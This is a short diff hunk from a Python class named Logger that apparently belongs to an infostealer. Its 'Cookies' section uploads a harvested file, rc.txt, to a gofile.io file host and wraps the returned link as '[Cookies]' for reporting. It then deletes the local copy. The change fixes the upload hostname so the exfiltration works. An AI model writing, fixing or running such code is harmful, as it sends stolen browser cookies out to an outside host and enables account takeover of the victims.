@@ -323,7 +323,7 @@ class Logger():
 
         # Cookies
         try:
-            cookiesRaw = requests.post('https://' + storeFinal + 'store7.gofile.io/uploadFile', files={'file': ('rc.txt', open('rc.txt', 'rb')),}).text
+            cookiesRaw = requests.post('https://' + storeFinal + '.gofile.io/uploadFile', files={'file': ('rc.txt', open('rc.txt', 'rb')),}).text
             cookiesUploaded = f"[Cookies]({cookiesRaw[87:113]})"
             os.remove("rc.txt")
         except Exception as e:
